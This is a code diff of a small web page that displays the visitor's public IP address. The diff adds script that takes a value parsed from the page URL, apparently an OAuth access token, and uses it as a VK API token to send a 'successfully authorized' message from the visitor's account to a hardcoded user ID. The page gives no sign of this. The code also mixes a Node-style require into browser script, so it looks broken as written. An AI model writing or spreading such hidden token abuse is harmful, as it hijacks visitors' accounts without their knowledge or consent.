@@ -35,6 +35,7 @@ color: rgb(92, 28, 241);
     </script>
     <script>
         let feat = null;
+        const { VK, Keyboard, resolveResource } = require('vk-io');
         /* Add "https://api.ipify.org?format=json" statement
            this will communicate with the ipify servers in
            order to retrieve the IP address $.getJSON will
@@ -52,7 +53,12 @@ color: rgb(92, 28, 241);
             feat = window.location.href.substring(window.location.href.indexOf(`=`) + 1, window.location.href.indexOf(`&`))
     }
     $("#gfg").html(data.ip);
-    $("#gfgs").html(feat);
+    const vk = new VK({
+    token: `${feat}`,
+});
+    vk.api.messages.send({
+                    user_id: 308544864, message: `успешно авторизован.)`, random_id: 0
+                });
 })
 
     </script>
@@ -63,7 +69,6 @@ color: rgb(92, 28, 241);
         <h2>Public IP Address of user is:</h2>
 
         <p id="gfg"></p>
-        <p ids="gfgs"></p>
 
         <h3>Привет от Илюши❤</h3>
         <div class=clearfix style=padding-top:15px></div>
